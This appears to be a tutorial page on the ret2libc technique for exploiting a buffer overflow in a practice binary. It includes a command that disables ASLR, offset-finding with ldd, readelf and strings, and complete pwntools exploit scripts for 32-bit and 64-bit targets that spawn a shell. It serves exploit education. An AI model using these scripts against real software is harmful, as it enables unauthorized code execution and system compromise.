---
description: The standard ROP exploit
---

# ret2libc

A ret2libc is based off the `system` function found within the C library. This function executes anything passed to it making it the best target. Another thing found within libc is the string `/bin/sh`; if you pass this string to `system`, it will pop a shell.

And that is the entire basis of it - passing `/bin/sh` as a parameter to `system`. Doesn't sound too bad, right?

{% file src="../../../.gitbook/assets/ret2libc \(1\).zip" caption="ret2libc" %}

## Disabling ASLR

To start with, we are going to disable ASLR. ASLR randomises the location of libc in memory, meaning we cannot \(without other steps\) work out the location of `system` and `/bin/sh`. To understand the general theory, we will start with it disabled.

```text
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Manual Exploitation

### Getting Libc and its base

Fortunately Linux has a command called `ldd` for dynamic linking. If we run it on our compiled ELF file, it'll tell us the libraries it uses and their base addresses.

```text
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```

We need `libc.so.6`, so the base address of libc is `0xf7dc2000`.

> Note: Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use **your** values.

### Getting the location of system\(\)

To call system, we obviously need its location in memory. We can use the `readelf` command for this.

```text
$ readelf -s /lib32/libc.so.6 | grep system
1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```

The `-s` flag tells `readelf` to search for symbols, for example functions. Here we can find the offset of system from libc base is `0x44f00`.

### Getting the location of /bin/sh

Since `/bin/sh` is just a string, we can use `strings` on the dynamic library we just found with `ldd`. Note that when passing strings as parameters you need to pass a **pointer** to the string, not the hex representation of the string, because that's how C expects it.

```text
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```

`-a` tells it to scan the entire file; `-t x` tells it to output the offset in hex.

### 32-bit Exploit

```python
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

### 64-bit Exploit

Repeat the process with the `libc` linked to the 64-bit exploit \(should be called something like `/lib/x86_64-linux-gnu/libc.so.6`\).

Note that instead of passing the parameter in after the return pointer, you will have to use a `pop rdi; ret` gadget to put it into the RDI register.

```text
$ ROPgadget --binary vuln-64 | grep rdi

[...]
0x00000000004011cb : pop rdi ; ret
```

```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```

## Automating with Pwntools

Unsurprisingly, pwntools has a bunch of features that make this much simpler.

```python
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # Search for the string + grab 1st occurence

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

The 64-bit looks essentially the same.

> Note: Pwntools can simplify it even more with its ROP capabilities, but I won't showcase them here.

